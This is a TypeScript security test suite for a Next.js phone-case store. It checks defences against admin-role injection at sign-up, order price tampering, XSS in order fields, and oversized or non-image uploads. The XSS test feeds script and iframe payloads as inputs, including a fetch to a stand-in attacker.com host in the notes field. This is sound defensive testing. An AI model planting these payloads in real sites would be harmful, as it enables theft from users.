import http from "http";
import { AddressInfo } from "net";

// Polyfill WebSocket para execução de testes em Node 20 sem ambiente de navegador
class MockWebSocket {
  static CONNECTING = 0;
  static OPEN = 1;
  static CLOSING = 2;
  static CLOSED = 3;
  readyState = 1;
  url = "";
  protocol = "";
  close() {}
  send() {}
  onopen = null;
  onmessage = null;
  onclose = null;
  onerror = null;
  addEventListener() {}
  removeEventListener() {}
}
(globalThis as any).WebSocket = MockWebSocket;
(global as any).WebSocket = MockWebSocket;

interface TestResult {
  title: string;
  category: string;
  passed: boolean;
  details: string;
}

const results: TestResult[] = [];

function logTest(category: string, title: string, passed: boolean, details: string) {
  results.push({ category, title, passed, details });
  const icon = passed ? "✅ PASS" : "❌ FAIL";
  console.log(`${icon} [${category}] ${title}`);
  if (!passed || process.env.VERBOSE) {
    console.log(`   └─ ${details}`);
  }
}

// Utilitário para simular requisição HTTP chamando os Route Handlers do Next.js
async function simulateRouteCall(
  handler: (req: Request) => Promise<Response>,
  url: string,
  method: string,
  body?: any,
  headers: Record<string, string> = {}
) {
  const reqHeaders = new Headers({
    "content-type": "application/json",
    ...headers,
  });

  const request = new Request(url, {
    method,
    headers: reqHeaders,
    body: body ? JSON.stringify(body) : undefined,
  });

  const response = await handler(request);
  const data = await response.json().catch(() => ({}));
  return { status: response.status, data, headers: response.headers };
}

async function runSecurityTests() {
  console.log("\n🧪 Iniciando Bateria de Testes de Segurança & Backend Architecture...\n");

  const { POST: registerHandler } = await import("../src/app/api/auth/register/route");
  const { POST: ordersHandler } = await import("../src/app/api/orders/route");
  const { POST: uploadHandler } = await import("../src/app/api/upload/route");

  // =========================================================================
  // CASO DE TESTE 1: Auto-Elevação de Privilégio (Registo Público de Usuário)
  // =========================================================================
  try {
    const maliciousPayload = {
      name: "Attacker Test",
      email: `hacker_${Date.now()}@test.com`,
      password: "password123",
      role: "admin", // Tentativa de injeção de papel de Admin
    };

    const res = await simulateRouteCall(
      registerHandler,
      "http://localhost:3000/api/auth/register",
      "POST",
      maliciousPayload
    );

    // O usuário DEVE ter sido cadastrado como customer, ignorando o role: "admin"
    const isCustomer = res.data?.user?.isAdmin === false;
    const isSuccess = res.status === 200 && isCustomer;

    logTest(
      "Segurança de Autenticação",
      "Bloqueio de injeção de 'role: admin' no cadastro público",
      isSuccess,
      `Status HTTP: ${res.status}, Resposta isAdmin: ${res.data?.user?.isAdmin}`
    );
  } catch (err: any) {
    logTest("Segurança de Autenticação", "Bloqueio de injeção de 'role: admin'", false, err.message);
  }

  // =========================================================================
  // CASO DE TESTE 2: Adulteração / Tampering de Preço (Order Price Recalculation)
  // =========================================================================
  try {
    const tamperedOrder = {
      id: `test_ord_${Date.now()}`,
      orderNumber: "TEST-9999",
      customer: {
        name: "Test Customer",
        email: "customer@test.com",
        whatsapp: "11999999999",
        cpf: "123.456.789-00",
      },
      shippingAddress: {
        zipCode: "01000-000",
        street: "Rua Teste",
        number: "123",
        neighborhood: "Centro",
        city: "São Paulo",
        state: "SP",
      },
      items: [
        {
          id: "item_tampered_1",
          model: { id: "iphone-16-pro-max", name: "iPhone 16 Pro Max", basePrice: 1.00 }, // Adulterado de 79.90 para 1.00
          finish: { id: "anti-impact", name: "Anti Impacto", priceAdd: 0.50 }, // Adulterado de 0.00 para 0.50
          caseColor: "#000000",
          customization: { imageUrl: "https://example.com/test.png", scale: 1, position: { x: 0, y: 0 }, rotation: 0 },
          previewMockupUrl: "https://example.com/test.png",
          highResPrintUrl: "https://example.com/test.png",
          quantity: 2,
          unitPrice: 1.50, // Preço forçado falso pelo cliente
          totalPrice: 3.00, // Total forçado falso pelo cliente
          createdAt: new Date().toISOString(),
        },
      ],
      subtotal: 3.00, // Forçado
      shippingCost: 10.00,
      discount: 0,
      totalAmount: 13.00, // Preço adulterado final
      paymentMethod: "pix",
      paymentStatus: "pending",
      status: "pending",
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    const res = await simulateRouteCall(
      ordersHandler,
      "http://localhost:3000/api/orders",
      "POST",
      tamperedOrder
    );

    // iPhone 16 Pro Max (79.90) + Anti-Impacto (0.00) = R$ 79.90 por unidade. Qtd 2 = R$ 159.80.
    // Total com frete (10.00) = R$ 169.80.
    const realOrder = res.data?.order;
    const realUnitPrice = realOrder?.items[0]?.unitPrice;
    const realTotalAmount = realOrder?.totalAmount;

    const priceRecalculatedCorrectly = realUnitPrice === 79.90 && realTotalAmount === 169.80;

    logTest(
      "Integridade Financeira",
      "Recálculo de preços no servidor (Prevenção de fraude em pedidos)",
      priceRecalculatedCorrectly,
      `Preço unitário enviado: R$ 1.50 -> Calculado pelo Server: R$ ${realUnitPrice} | Total real: R$ ${realTotalAmount}`
    );
  } catch (err: any) {
    logTest("Integridade Financeira", "Recálculo de preços no servidor", false, err.message);
  }

  // =========================================================================
  // CASO DE TESTE 3: Sanitização de Dados contra XSS / Script Injection
  // =========================================================================
  try {
    const xssOrder = {
      id: `test_xss_${Date.now()}`,
      orderNumber: "TEST-XSS",
      customer: {
        name: "<b>Hacker Name</b><script>alert('xss')</script>",
        email: "hacker@xss.com",
        whatsapp: "11-99999-8888",
        cpf: "123.456.789-00",
      },
      shippingAddress: {
        zipCode: "01000-000",
        street: "Rua <iframe src=javascript:alert(1)>",
        number: "10",
        neighborhood: "Bairro <i>Injetado</i>",
        city: "São Paulo",
        state: "SP",
      },
      items: [
        {
          id: "item_xss_1",
          model: { id: "iphone-13", name: "iPhone 13", basePrice: 79.90 },
          finish: { id: "clear-tpu", name: "Clear TPU", priceAdd: 0 },
          caseColor: "#000000",
          customization: { imageUrl: "https://example.com/test.png", scale: 1, position: { x: 0, y: 0 }, rotation: 0 },
          previewMockupUrl: "https://example.com/test.png",
          highResPrintUrl: "https://example.com/test.png",
          quantity: 1,
          unitPrice: 79.90,
          totalPrice: 79.90,
          createdAt: new Date().toISOString(),
        },
      ],
      subtotal: 79.90,
      shippingCost: 0,
      discount: 0,
      totalAmount: 79.90,
      paymentMethod: "pix",
      paymentStatus: "pending",
      status: "pending",
      notes: "Por favor entregar rápido <script>fetch('http://attacker.com/steal')</script>",
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    const res = await simulateRouteCall(
      ordersHandler,
      "http://localhost:3000/api/orders",
      "POST",
      xssOrder
    );

    const savedCustomerName = res.data?.order?.customer?.name;
    const savedNotes = res.data?.order?.notes;
    const savedStreet = res.data?.order?.shippingAddress?.street;

    const isSanitized =
      !savedCustomerName.includes("<script>") &&
      !savedNotes.includes("<script>") &&
      !savedStreet.includes("<iframe");

    logTest(
      "Segurança de Dados",
      "Sanitização Server-side contra ataques XSS e injeção de scripts HTML",
      isSanitized,
      `Nome salvo: "${savedCustomerName}" | Notas salvas: "${savedNotes}"`
    );
  } catch (err: any) {
    logTest("Segurança de Dados", "Sanitização Server-side contra XSS", false, err.message);
  }

  // =========================================================================
  // CASO DE TESTE 4: Validação de Upload de Arquivos (MIME Type e Tamanho)
  // =========================================================================
  try {
    // 4.1 Teste de Formato Inválido (Ex: executável .exe / script .js)
    const invalidFormatBody = {
      imageBase64: "data:text/javascript;base64,YWxlcnQoJ1hTUycp",
      filename: "malicious.js",
    };

    const resInvalid = await simulateRouteCall(
      uploadHandler,
      "http://localhost:3000/api/upload",
      "POST",
      invalidFormatBody
    );

    const blockedInvalidFormat = resInvalid.status === 400 && resInvalid.data?.error?.includes("Formato de arquivo não suportado");

    logTest(
      "Segurança de Upload",
      "Bloqueio de envio de tipos de arquivo não permitidos (JS/EXE)",
      blockedInvalidFormat,
      `Status HTTP: ${resInvalid.status}, Mensagem de Erro: "${resInvalid.data?.error}"`
    );

    // 4.2 Teste de Limite de Tamanho (> 15MB)
    const giantBuffer = Buffer.alloc(16 * 1024 * 1024, "a").toString("base64"); // 16MB
    const oversizedBody = {
      imageBase64: `data:image/png;base64,${giantBuffer}`,
      filename: "huge_image.png",
    };

    const resOversized = await simulateRouteCall(
      uploadHandler,
      "http://localhost:3000/api/upload",
      "POST",
      oversizedBody
    );

    const blockedOversized = resOversized.status === 400 && resOversized.data?.error?.includes("muito grande");

    logTest(
      "Segurança de Upload",
      "Bloqueio de arquivos com tamanho superior ao limite de 15MB",
      blockedOversized,
      `Status HTTP: ${resOversized.status}, Mensagem de Erro: "${resOversized.data?.error}"`
    );
  } catch (err: any) {
    logTest("Segurança de Upload", "Validação de upload de arquivos", false, err.message);
  }

  // Resumo final
  console.log("\n=======================================================");
  const passedCount = results.filter((r) => r.passed).length;
  console.log(`📊 TOTAL DE TESTES DE SEGURANÇA: ${results.length}`);
  console.log(`✅ APROVADOS: ${passedCount}`);
  console.log(`❌ FALHAS: ${results.length - passedCount}`);
  console.log("=======================================================\n");

  if (passedCount !== results.length) {
    process.exit(1);
  }
}

runSecurityTests().catch((err) => {
  console.error("Erro fatal nos testes:", err);
  process.exit(1);
});
